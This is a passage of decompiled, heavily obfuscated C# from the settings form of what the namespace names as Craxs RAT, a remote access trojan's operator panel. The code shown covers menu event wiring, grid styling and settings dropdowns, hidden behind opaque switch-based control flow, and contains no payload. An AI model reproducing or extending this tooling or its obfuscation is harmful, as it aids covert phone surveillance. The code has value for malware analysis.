        EventHandler eventHandler = new EventHandler(this.DefaultToolStripMenuItem_Click);
        ToolStripMenuItem toolStripMenuItem = ((SMSManager) this)._DefaultToolStripMenuItem;
label_1:
        int num1 = -1358725501;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(num1 - 1617833311 * (-804149593 * (~(1520298686 - 263989622) ^ -(-236226204 ^ 1382619904))) ^ -(1821494623 * -1333230739)) - -(397716083 ^ 751677465))) % 8U)
          {
            case 0:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * -1674039281 ^ -672658372;
              continue;
            case 1:
              toolStripMenuItem = ((SMSManager) this)._DefaultToolStripMenuItem;
              num1 = (int) num2 * 1970272346 ^ 507920044;
              continue;
            case 2:
              goto label_1;
            case 3:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * 1329566899 ^ 2027351232;
              continue;
            case 4:
              int num3 = toolStripMenuItem == null ? -712430980 : (num3 = -274162950);
              num1 = num3 ^ (int) num2 * -1470934448;
              continue;
            case 5:
              int num4 = toolStripMenuItem == null ? -1564540082 : (num4 = -1240096134);
              num1 = num4 ^ (int) num2 * 1142987339;
              continue;
            case 6:
              goto label_3;
            case 7:
              ((SMSManager) this)._DefaultToolStripMenuItem = value;
              num1 = -1888753985;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual ToolStripMenuItem clr_1
    {
      get => ((SMSManager) this)._clr_1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.clr_1ToolStripMenuItem_Click);
        ToolStripMenuItem clr1 = ((SMSManager) this)._clr_1;
label_1:
        int num1 = 2045954969;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ~(~2089313295 - (~(num2 + ((-(519515266 ^ -1206597108) ^ ~(1348987167 - -845970128) - ---89340291) - 870363070 * -500313031) + ((1480999612 ^ 1019448786) + -972433284 * 2115764289 - ~-705798832 ^ (2137918378 + 700625694 ^ 2105429993 + 927042563) - (1183701932 - 1803390900 ^ 1514462354 ^ 452947565))) ^ 160933587 * (828848213 * -1529291403)))) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              clr1.Click += eventHandler;
              num1 = (int) num3 * 733470191 ^ -1543120261;
              continue;
            case 3:
              ((SMSManager) this)._clr_1 = value;
              clr1 = ((SMSManager) this)._clr_1;
              int num4;
              num1 = num4 = clr1 == null ? -1766636413 : (num4 = 942199460);
              continue;
            case 4:
              clr1.Click -= eventHandler;
              num1 = (int) num3 * 2106275894 ^ -2097763791;
              continue;
            case 5:
              int num5 = clr1 == null ? -800537666 : (num5 = 1719947407);
              num1 = num5 ^ (int) num3 * -1972670805;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    internal virtual ToolStripMenuItem clr_2
    {
      get => ((SMSManager) this)._clr_2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.clr_2ToolStripMenuItem_Click);
label_1:
        int num1 = 2031241920;
        ToolStripMenuItem clr2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~((num1 - -2113881401 * (~(242004801 + 558427573) + ~~869395659 + -412781853 * ~--1168763958) ^ -706881725 * (~-1254272089 ^ 311119390 - 521643315) * 172242505) - --1330071008) * -2022926831 - -1978001096)) % 8U)
          {
            case 0:
              goto label_3;
            case 1:
              clr2 = ((SMSManager) this)._clr_2;
              num1 = (int) num2 * -1281437555 ^ -1203931647;
              continue;
            case 2:
              clr2.Click += eventHandler;
              num1 = (int) num2 * -1164037882 ^ 914204427;
              continue;
            case 3:
              clr2.Click -= eventHandler;
              num1 = (int) num2 * 560743220 ^ -1363109331;
              continue;
            case 4:
              goto label_1;
            case 5:
              int num3 = clr2 == null ? 698207385 : (num3 = 1393532334);
              num1 = num3 ^ (int) num2 * -1731630808;
              continue;
            case 6:
              ((SMSManager) this)._clr_2 = value;
              clr2 = ((SMSManager) this)._clr_2;
              num1 = -58183734;
              continue;
            case 7:
              int num4 = clr2 == null ? 1925935567 : (num4 = 151161901);
              num1 = num4 ^ (int) num2 * 114917992;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual ToolStripMenuItem Clr3ToolStripMenuItem
    {
      get => ((SMSManager) this)._Clr3ToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Clr3ToolStripMenuItem_Click);
label_1:
        int num1 = 3935050;
        while (true)
        {
          int num2 = num1;
          uint num3;
          ToolStripMenuItem toolStripMenuItem;
          switch ((num3 = (uint) (--(((~(344682552 ^ -196847562) * -619921745 + -1241843402 * -1926748261 ^ -313801813 * 542315646 + (1476467043 ^ -1380296326) - ~~-1387042358 + ---1917991948) - num2 ^ ~(382728271 * (1104495721 - 107616670) ^ ~--715114220)) - -(~-870894797 ^ 627421131 - 1983032692)) - 1241629363)) % 8U)
          {
            case 0:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * -1281482054 ^ -1419841777;
              continue;
            case 1:
              ((SMSManager) this)._Clr3ToolStripMenuItem = value;
              num1 = -464479546;
              continue;
            case 2:
              int num4 = toolStripMenuItem == null ? 346420595 : (num4 = -594193041);
              num1 = num4 ^ (int) num3 * 1466503390;
              continue;
            case 3:
              toolStripMenuItem = ((SMSManager) this)._Clr3ToolStripMenuItem;
              int num5 = toolStripMenuItem == null ? 1383918496 : (num5 = 2008792044);
              num1 = num5 ^ (int) num3 * 1540568692;
              continue;
            case 4:
              goto label_3;
            case 5:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * 1192714337 ^ -1830829551;
              continue;
            case 6:
              goto label_1;
            case 7:
              toolStripMenuItem = ((SMSManager) this)._Clr3ToolStripMenuItem;
              num1 = (int) num3 * -1731231732 ^ 2024194165;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual ToolStripMenuItem Clr4ToolStripMenuItem
    {
      get => ((SMSManager) this)._Clr4ToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Clr4ToolStripMenuItem_Click);
label_1:
        int num1 = 2011169290;
        ToolStripMenuItem toolStripMenuItem;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(~~~num1 - 1144158304 ^ -1738429711)) % 8U)
          {
            case 0:
              ((SMSManager) this)._Clr4ToolStripMenuItem = value;
              toolStripMenuItem = ((SMSManager) this)._Clr4ToolStripMenuItem;
              num1 = -2005532812;
              continue;
            case 1:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * 1818763842 ^ 161476491;
              continue;
            case 2:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * -840173197 ^ 1327133665;
              continue;
            case 3:
              toolStripMenuItem = ((SMSManager) this)._Clr4ToolStripMenuItem;
              num1 = (int) num2 * 593704081 ^ -1994157267;
              continue;
            case 4:
              goto label_1;
            case 5:
              int num3 = toolStripMenuItem == null ? -285416371 : (num3 = -445652007);
              num1 = num3 ^ (int) num2 * -855941502;
              continue;
            case 6:
              goto label_3;
            case 7:
              int num4 = toolStripMenuItem == null ? 901462855 : (num4 = 864701534);
              num1 = num4 ^ (int) num2 * -1315109278;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual ToolStripMenuItem Clr5ToolStripMenuItem
    {
      get => ((SMSManager) this)._Clr5ToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Clr5ToolStripMenuItem_Click);
        ToolStripMenuItem toolStripMenuItem = ((SMSManager) this)._Clr5ToolStripMenuItem;
label_1:
        int num1 = 1220290588;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (~(--678853841 - -~((1198677144 ^ 1867963621) - (-79704232 - -937231738)) - num2 - (-1007631561 * ((1932051397 ^ 709506098) + 1286002714 * 1932894129) + 1991852841 * -(-975950633 * 475654407))) - (207152715 * 572760204 - 1042809919 * -1183461057))) % 6U)
          {
            case 0:
              ((SMSManager) this)._Clr5ToolStripMenuItem = value;
              toolStripMenuItem = ((SMSManager) this)._Clr5ToolStripMenuItem;
              int num4;
              num1 = num4 = toolStripMenuItem == null ? 1842854499 : (num4 = 2102688571);
              continue;
            case 1:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * -1171634599 ^ 1404378946;
              continue;
            case 2:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * -1545782006 ^ 1478488387;
              continue;
            case 3:
              goto label_1;
            case 4:
              goto label_3;
            case 5:
              int num5 = toolStripMenuItem == null ? 2100567372 : (num5 = 1159976131);
              num1 = num5 ^ (int) num3 * 1797840995;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    internal virtual ToolStripMenuItem Clr6ToolStripMenuItem
    {
      get => ((SMSManager) this)._Clr6ToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Clr6ToolStripMenuItem_Click);
label_1:
        int num1 = 1487660911;
        while (true)
        {
          int num2 = num1;
          uint num3;
          ToolStripMenuItem toolStripMenuItem;
          switch ((num3 = (uint) ~(--1008208718 - num2 * -1342140961)) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              ((SMSManager) this)._Clr6ToolStripMenuItem = value;
              num1 = 952704156;
              continue;
            case 2:
              toolStripMenuItem = ((SMSManager) this)._Clr6ToolStripMenuItem;
              num1 = (int) num3 * 420473359 ^ 1672825699;
              continue;
            case 3:
              goto label_3;
            case 4:
              int num4 = toolStripMenuItem == null ? -1998826360 : (num4 = -789487278);
              num1 = num4 ^ (int) num3 * 1767234378;
              continue;
            case 5:
              toolStripMenuItem = ((SMSManager) this)._Clr6ToolStripMenuItem;
              int num5 = toolStripMenuItem == null ? -175022049 : (num5 = -1068467918);
              num1 = num5 ^ (int) num3 * -172242683;
              continue;
            case 6:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * -2025453787 ^ 1581875448;
              continue;
            case 7:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * 1912777482 ^ 1301344870;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual ToolStripMenuItem Clr7ToolStripMenuItem
    {
      get => ((SMSManager) this)._Clr7ToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Clr7ToolStripMenuItem_Click);
label_1:
        int num1 = -400128657;
        while (true)
        {
          int num2 = num1;
          uint num3;
          ToolStripMenuItem toolStripMenuItem;
          switch ((num3 = (uint) (-~(-(-1766450360 * -1660130237 + ~-427922926 ^ -1526893241) - (~-(-1035262296 - 2001671174) * 1800541541 - ~(~--1087424999 - -1249301804) - num2) ^ -325030209) + 281325060)) % 7U)
          {
            case 0:
              int num4 = toolStripMenuItem == null ? -429281851 : (num4 = 1594109678);
              num1 = num4 ^ (int) num3 * 1464679572;
              continue;
            case 1:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * -1025878374 ^ -1490455845;
              continue;
            case 2:
              toolStripMenuItem = ((SMSManager) this)._Clr7ToolStripMenuItem;
              int num5 = toolStripMenuItem == null ? 699198683 : (num5 = 1316602497);
              num1 = num5 ^ (int) num3 * 1928975922;
              continue;
            case 3:
              ((SMSManager) this)._Clr7ToolStripMenuItem = value;
              toolStripMenuItem = ((SMSManager) this)._Clr7ToolStripMenuItem;
              num1 = -285363432;
              continue;
            case 4:
              goto label_3;
            case 5:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * 260053853 ^ 578428959;
              continue;
            case 6:
              goto label_1;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual ToolStripMenuItem Clr8ToolStripMenuItem
    {
      get => ((SMSManager) this)._Clr8ToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Clr8ToolStripMenuItem_Click);
label_1:
        int num1 = -997033526;
        while (true)
        {
          int num2 = num1;
          uint num3;
          ToolStripMenuItem toolStripMenuItem;
          switch ((num3 = (uint) (~~-(19358186 + ((465515622 ^ -1506399679) * -207225533 - -(572231049 - 772799862)) - num2 * -1517910169) - 1930246196)) % 7U)
          {
            case 0:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * 1197647501 ^ 287939621;
              continue;
            case 1:
              toolStripMenuItem = ((SMSManager) this)._Clr8ToolStripMenuItem;
              int num4 = toolStripMenuItem == null ? -669965783 : (num4 = 1895485577);
              num1 = num4 ^ (int) num3 * -1724734116;
              continue;
            case 2:
              goto label_3;
            case 3:
              toolStripMenuItem = ((SMSManager) this)._Clr8ToolStripMenuItem;
              int num5 = toolStripMenuItem == null ? 1402791785 : (num5 = 446565646);
              num1 = num5 ^ (int) num3 * -1475759089;
              continue;
            case 4:
              ((SMSManager) this)._Clr8ToolStripMenuItem = value;
              num1 = 1465487721;
              continue;
            case 5:
              goto label_1;
            case 6:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * -945700767 ^ 932161368;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual ToolStripMenuItem Clr9ToolStripMenuItem
    {
      get => ((SMSManager) this)._Clr9ToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Clr9ToolStripMenuItem_Click);
label_1:
        int num1 = -415328727;
        ToolStripMenuItem toolStripMenuItem;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(~((-num1 ^ -(-1976479717 * 1428310273)) - (-125918765 * 1563659117 - ~753855109 - (-1357672187 * 1429115877 + (-905963092 ^ -1666847395)))) * -1274713941)) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              toolStripMenuItem = ((SMSManager) this)._Clr9ToolStripMenuItem;
              int num3 = toolStripMenuItem == null ? -1346120077 : (num3 = -2076721501);
              num1 = num3 ^ (int) num2 * -2103361784;
              continue;
            case 2:
              int num4 = toolStripMenuItem == null ? 1041307501 : (num4 = -1824467179);
              num1 = num4 ^ (int) num2 * 1282500017;
              continue;
            case 3:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * -1793560994 ^ -753575003;
              continue;
            case 4:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * -1072417167 ^ 283864110;
              continue;
            case 5:
              goto label_1;
            case 6:
              ((SMSManager) this)._Clr9ToolStripMenuItem = value;
              toolStripMenuItem = ((SMSManager) this)._Clr9ToolStripMenuItem;
              num1 = 1583620432;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    public Settings()
    {
      this.Load += new EventHandler(this.Settings_Load);
      ((getIconFrmReg) this).InitializeComponent();
      this.Font = Settings.f;
    }

    private void TOpacity_Tick(object sender, EventArgs e)
    {
      if (this.Opacity == 1.0)
        goto label_6;
label_1:
      int num1 = 1427978655;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((num1 + ~(861322831 ^ ~(~1368916830 ^ 1061933729 ^ 1387357214))) * -789789223 + (~~-746741362 - (281368964 ^ -825556469)))) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            num1 = (int) num2 * -277651421 ^ 360995533;
            continue;
          case 3:
            this.Opacity += 0.1;
            num1 = (int) num2 * 1292548240 ^ 561693297;
            continue;
          case 4:
            goto label_6;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:
      return;
label_6:
      this.TOpacity.Enabled = false;
      num1 = 1923142254;
      goto label_2;
    }

    private void SpyStyle()
    {
      IEnumerator<DataGridView> enumerator1;
      try
      {
        enumerator1 = this.Panel1.Controls.OfType<DataGridView>().GetEnumerator();
label_11:
        int num1 = enumerator1.MoveNext() ? -417363167 : (num1 = -1759903024);
        DataGridView current;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(--num1 * 129157465)) % 12U)
          {
            case 0:
              current.DefaultCellStyle.SelectionBackColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              current.ColumnHeadersDefaultCellStyle.ForeColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              current.CellBorderStyle = DataGridViewCellBorderStyle.Single;
              num1 = (int) num2 * -394457624 ^ 727897310;
              continue;
            case 1:
              current.RowHeadersBorderStyle = DataGridViewHeaderBorderStyle.None;
              num1 = (int) num2 * -307229799 ^ -223391066;
              continue;
            case 2:
              current = enumerator1.Current;
              current.BackgroundColor = Settings.DefaultColor_Background;
              num1 = -24367746;
              continue;
            case 3:
              num1 = -417363167;
              continue;
            case 4:
              current.DefaultCellStyle.BackColor = Settings.DefaultColor_Background;
              current.DefaultCellStyle.SelectionForeColor = Settings.DefaultColor_Background;
              current.DefaultCellStyle.ForeColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              num1 = (int) num2 * -1118263371 ^ 68502515;
              continue;
            case 5:
              current.GridColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              current.BorderStyle = BorderStyle.None;
              num1 = (int) num2 * 1273637816 ^ 1561468185;
              continue;
            case 6:
              goto label_11;
            case 8:
              current.RowHeadersVisible = false;
              num1 = (int) num2 * 1419186754 ^ 1719408452;
              continue;
            case 9:
              current.BackColor = Settings.DefaultColor_Background;
              current.ColumnHeadersDefaultCellStyle.BackColor = Settings.DefaultColor_Background;
              num1 = (int) num2 * 1468198975 ^ 1914982192;
              continue;
            case 10:
              current.ColumnHeadersVisible = false;
              current.EnableHeadersVisualStyles = false;
              num1 = (int) num2 * -1628378182 ^ -1143167322;
              continue;
            case 11:
              current.SelectionMode = DataGridViewSelectionMode.CellSelect;
              current.MultiSelect = false;
              num1 = (int) num2 * 1650815287 ^ 1620220648;
              continue;
            default:
              goto label_18;
          }
        }
      }
      finally
      {
        if (enumerator1 != null)
        {
label_14:
          int num3 = 586402623;
          while (true)
          {
            uint num4;
            switch ((num4 = (uint) ~(--num3 * 129157465)) % 3U)
            {
              case 0:
                goto label_14;
              case 2:
                enumerator1.Dispose();
                num3 = (int) num4 * 1633180827 ^ 1695766906;
                continue;
              default:
                goto label_17;
            }
          }
        }
label_17:;
      }
label_18:
      IEnumerator<Label> enumerator2;
      try
      {
        enumerator2 = this.Panel1.Controls.OfType<Label>().GetEnumerator();
label_23:
        int num5 = enumerator2.MoveNext() ? -1276090638 : (num5 = 1258003244);
        Label current;
        while (true)
        {
          uint num6;
          switch ((num6 = (uint) ~(--num5 * 129157465)) % 6U)
          {
            case 0:
              current.BackColor = Settings.DefaultColor_Background;
              num5 = (int) num6 * -1591934948 ^ 688096051;
              continue;
            case 2:
              current.ForeColor = Settings.DefaultColor_ColorTitles;
              num5 = (int) num6 * 708518400 ^ 670392855;
              continue;
            case 3:
              num5 = -1276090638;
              continue;
            case 4:
              goto label_23;
            case 5:
              current = enumerator2.Current;
              num5 = -1747510621;
              continue;
            default:
              goto label_30;
          }
        }
      }
      finally
      {
        if (enumerator2 != null)
        {
label_26:
          int num7 = 1983071298;
          while (true)
          {
            uint num8;
            switch ((num8 = (uint) ~(--num7 * 129157465)) % 3U)
            {
              case 0:
                goto label_26;
              case 2:
                enumerator2.Dispose();
                num7 = (int) num8 * 742484822 ^ 75640822;
                continue;
              default:
                goto label_29;
            }
          }
        }
label_29:;
      }
label_30:
      IEnumerator<Button> enumerator3;
      try
      {
        enumerator3 = this.Panel2.Controls.OfType<Button>().GetEnumerator();
label_31:
        int num9 = 1755913925;
        Button current;
        while (true)
        {
          uint num10;
          switch ((num10 = (uint) ~(--num9 * 129157465)) % 7U)
          {
            case 0:
              int num11;
              num9 = num11 = enumerator3.MoveNext() ? 242459914 : (num11 = 984051045);
              continue;
            case 1:
              current.ForeColor = Settings.DefaultColor_Background;
              num9 = (int) num10 * 1103909994 ^ 766892346;
              continue;
            case 2:
              goto label_31;
            case 4:
              num9 = (int) num10 * -1400803775 ^ 872112740;
              continue;
            case 5:
              current.BackColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              num9 = (int) num10 * -142993867 ^ -1699022972;
              continue;
            case 6:
              current = enumerator3.Current;
              num9 = -1785684242;
              continue;
            default:
              goto label_43;
          }
        }
      }
      finally
      {
        if (enumerator3 != null)
        {
label_39:
          int num12 = 959583722;
          while (true)
          {
            uint num13;
            switch ((num13 = (uint) ~(--num12 * 129157465)) % 3U)
            {
              case 1:
                enumerator3.Dispose();
                num12 = (int) num13 * -1969608048 ^ 1468563888;
                continue;
              case 2:
                goto label_39;
              default:
                goto label_42;
            }
          }
        }
label_42:;
      }
label_43:
      IEnumerator<Panel> enumerator4;
      try
      {
        enumerator4 = this.Controls.OfType<Panel>().GetEnumerator();
label_44:
        int num14 = 1633408542;
        Panel current;
        while (true)
        {
          uint num15;
          switch ((num15 = (uint) ~(--num14 * 129157465)) % 7U)
          {
            case 0:
              goto label_55;
            case 1:
              num14 = (int) num15 * -1680305965 ^ -1718667583;
              continue;
            case 2:
              current.ForeColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              num14 = (int) num15 * 7747507 ^ 1584673286;
              continue;
            case 3:
              current = enumerator4.Current;
              num14 = 299909825;
              continue;
            case 4:
              current.BackColor = Settings.DefaultColor_Background;
              num14 = (int) num15 * -308110924 ^ 1485937971;
              continue;
            case 5:
              goto label_44;
            case 6:
              int num16;
              num14 = num16 = enumerator4.MoveNext() ? 846644210 : (num16 = 2022956396);
              continue;
            default:
              goto label_51;
          }
        }
label_55:
        return;
label_51:;
      }
      finally
      {
        if (enumerator4 != null)
        {
label_53:
          int num17 = 838322865;
          while (true)
          {
            uint num18;
            switch ((num18 = (uint) ~(--num17 * 129157465)) % 3U)
            {
              case 0:
                goto label_53;
              case 2:
                enumerator4.Dispose();
                num17 = (int) num18 * -194220125 ^ -141395132;
                continue;
              default:
                goto label_57;
            }
          }
        }
label_57:;
      }
    }

    private void grreSize()
    {
      IEnumerator<DataGridView> enumerator;
      try
      {
        enumerator = this.Panel1.Controls.OfType<DataGridView>().GetEnumerator();
label_1:
        int num1 = -404110227;
        DataGridView current;
        int num2;
        while (true)
        {
          uint num3;
          switch ((num3 = (uint) (~(~num1 * 344366265 ^ ~((-447375162 ^ 856492137) - (-676051597 ^ -1457182022))) - (1645898832 - -1500495351))) % 7U)
          {
            case 0:
              current.Height = checked (num2 + 5);
              num1 = (int) num3 * -1746071462 ^ -7481057;
              continue;
            case 1:
              goto label_12;
            case 2:
              int num4;
              num1 = num4 = enumerator.MoveNext() ? 41466055 : (num4 = -1055737954);
              continue;
            case 3:
              goto label_1;
            case 4:
              num2 = checked (current.Rows.Count * current.Rows[0].Height);
              num1 = (int) num3 * -938748358 ^ -1031492458;
              continue;
            case 5:
              current = enumerator.Current;
              num1 = 1422924531;
              continue;
            case 6:
              num1 = (int) num3 * -984688733 ^ -184697060;
              continue;
            default:
              goto label_8;
          }
        }
label_12:
        return;
label_8:;
      }
      finally
      {
        if (enumerator != null)
        {
label_10:
          int num5 = 2052761757;
          while (true)
          {
            uint num6;
            switch ((num6 = (uint) (~(~num5 * 344366265 ^ ~((-447375162 ^ 856492137) - (-676051597 ^ -1457182022))) - (1645898832 - -1500495351))) % 3U)
            {
              case 1:
                enumerator.Dispose();
                num5 = (int) num6 * -398061736 ^ -1467222720;
                continue;
              case 2:
                goto label_10;
              default:
                goto label_14;
            }
          }
        }
label_14:;
      }
    }

    private void Settings_Load(object sender, EventArgs e)
    {
      this.Icon = Craxs_Rat.My.Resources.Resources.max;
label_1:
      int num1 = -845722185;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (-(-1357258514 - ((-261634686 ^ 1226862754 * -720624123 ^ 402687177 * (-26391552 - 443660448)) + ((1204355421 ^ -139320295) + (675801555 + 2030721251) ^ ~-1365254824 - 1716713357) - ~-(-1166612200 ^ 1066361213 ^ -1595637545 * -1800480039) - num2 ^ 37977706 * 1923520349 + -1875360521 * (154845011 * -1702052283 ^ 859739976)) + (-2083650799 - (-834294678 ^ -1309279536))) * 1949719013)) % 6U)
        {
          case 0:
            goto label_1;
          case 1:
            this.TOpacity.Interval = Settings.T_Interval;
            this.TOpacity.Enabled = true;
            num1 = (int) num3 * -1060985661 ^ -183746794;
            continue;
          case 2:
            this.SpyStyle();
            num1 = (int) num3 * -1348914475 ^ -1411129578;
            continue;
          case 3:
            this.DGV5.ContextMenuStrip = this.ctxPacket;
            num1 = (int) num3 * -898972743 ^ 1366251527;
            continue;
          case 4:
            goto label_3;
          case 5:
            this.R();
            this.grreSize();
            num1 = (int) num3 * 261109051 ^ 1367928229;
            continue;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:;
    }

    private void R()
    {
      List<string> stringList = new List<string>();
label_1:
      int num1 = 1080936858;
      int index;
      DataGridViewComboBoxCell cell1;
      Color color;
      Graphics graphics;
      Bitmap bitmap;
      DataGridViewComboBoxCell cell2;
      Pen pen;
      DataGridViewComboBoxCell cell3;
      DataGridViewComboBoxCell cell4;
      DataGridViewComboBoxCell cell5;
      DataGridViewComboBoxCell cell6;
      DataGridViewComboBoxCell cell7;
      DataGridViewComboBoxCell cell8;
      DataGridViewComboBoxCell cell9;
      DataGridViewComboBoxCell cell10;
      DataGridViewComboBoxCell cell11;
      DataGridViewComboBoxCell cell12;
      DataGridViewComboBoxCell cell13;
      DataGridViewComboBoxCell cell14;
      DataGridViewComboBoxCell cell15;
      DataGridViewComboBoxCell cell16;
      DataGridViewComboBoxCell cell17;
      DataGridViewComboBoxCell cell18;
      DataGridViewComboBoxCell cell19;
      DataGridViewComboBoxCell cell20;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-(~~(num1 * 12390175) + ((1487358001 ^ -2046209967) - -1253240625 * -755799751)) ^ -809099706)) % 125U)
        {
          case 0:
            // ISSUE: reference to a compiler-generated method
            cell20.Value = (object) stringList[stringList.IndexOf(MySettings.get_Settings().Style_Maps)];
            num1 = (int) num2 * -1380648443 ^ 691095240;
            continue;
          case 1:
            graphics = Graphics.FromImage((Image) bitmap);
            num1 = (int) num2 * -848215304 ^ 1203612524;
            continue;
          case 2:
            index = this.DGV0.Rows.Add((object) EXGuarder.\u00342712342, null);
            num1 = (int) num2 * 121864516 ^ -85336605;
            continue;
          case 3:
            cell3.DataSource = (object) stringList;
            // ISSUE: reference to a compiler-generated method
            cell3.Value = (object) stringList[stringList.IndexOf(MySettings.get_Settings().Auto_focus)];
            num1 = (int) num2 * -1290397428 ^ -1508457153;
            continue;
          case 4:
            // ISSUE: reference to a compiler-generated method
            cell4.Value = (object) stringList[stringList.IndexOf(MySettings.get_Settings().Saving_data)];
            num1 = (int) num2 * -728357391 ^ -1620755563;
            continue;
          case 5:
            stringList = new List<string>();
            index = this.DGV1.Rows.Add((object) EXGuarder.\u0033F175802, null);
            cell18 = (DataGridViewComboBoxCell) this.DGV1.Rows[index].Cells[1];
            num1 = (int) num2 * 1832480425 ^ -1118700315;
            continue;
          case 6:
            bitmap = new Bitmap(21, 17);
            graphics = Graphics.FromImage((Image) bitmap);
            // ISSUE: reference to a compiler-generated method
            color = MySettings.get_Settings().DefaultColorBackground;
            graphics.Clear(color);
            num1 = (int) num2 * -1658702791 ^ -385009110;
            continue;
          case 7:
            bitmap = new Bitmap(21, 17);
            num1 = (int) num2 * -711633245 ^ 1411891796;
            continue;
          case 8:
            stringList.Add(EXGuarder.\u00327750871);
            stringList.Add(EXGuarder.\u00330482168);
            cell20.DataSource = (object) stringList;
            num1 = (int) num2 * 2073054071 ^ -433166325;
            continue;
          case 9:
            graphics = Graphics.FromImage((Image) bitmap);
            num1 = (int) num2 * -1634279164 ^ 1564687299;
            continue;
          case 10:
            stringList.Add(EXGuarder.\u0036D51615C);
            stringList.Add(EXGuarder.\u0031D0A5600);
            num1 = (int) num2 * 338335272 ^ -1788375179;
            continue;
          case 11:
            goto label_3;
          case 12:
            cell8.DataSource = (object) stringList;
            num1 = (int) num2 * 1252139602 ^ -1611927616;
            continue;
          case 13:
            // ISSUE: reference to a compiler-generated method
            color = MySettings.get_Settings().DefaultColor_ColorTitles;
            num1 = (int) num2 * 2115335838 ^ 692294980;
            continue;
          case 14:
            stringList.Add(EXGuarder.\u00349410063);
            num1 = (int) num2 * 281033386 ^ -2136546510;
            continue;
          case 15:
            graphics.Dispose();
            num1 = (int) num2 * -243648351 ^ 2103083857;
            continue;
          case 16:
            cell13 = (DataGridViewComboBoxCell) this.DGV0.Rows[index].Cells[1];
            stringList.Add(EXGuarder.\u0030423631F);
            stringList.Add(EXGuarder.\u0034946360B);
            num1 = (int) num2 * 992151738 ^ -98945796;
            continue;
          case 17:
            graphics.DrawRectangle(pen, 0, 0, checked (bitmap.Width - 1), checked (bitmap.Height - 1));
            num1 = (int) num2 * 1674621677 ^ -1807253393;
            continue;
          case 18:
            index = this.DGV8.Rows.Add((object) EXGuarder.\u00301632305, null);
            num1 = (int) num2 * -1485611093 ^ -528014639;
            continue;
          case 19:
            stringList.Add(EXGuarder.\u00342654304);
            stringList.Add(EXGuarder.\u0030C143563);
            cell15.DataSource = (object) stringList;
            // ISSUE: reference to a compiler-generated method
            cell15.Value = (object) stringList[stringList.IndexOf(MySettings.get_Settings().Flags_Visible)];
            num1 = (int) num2 * -625689200 ^ -1575975181;
            continue;
          case 20:
            stringList = new List<string>();
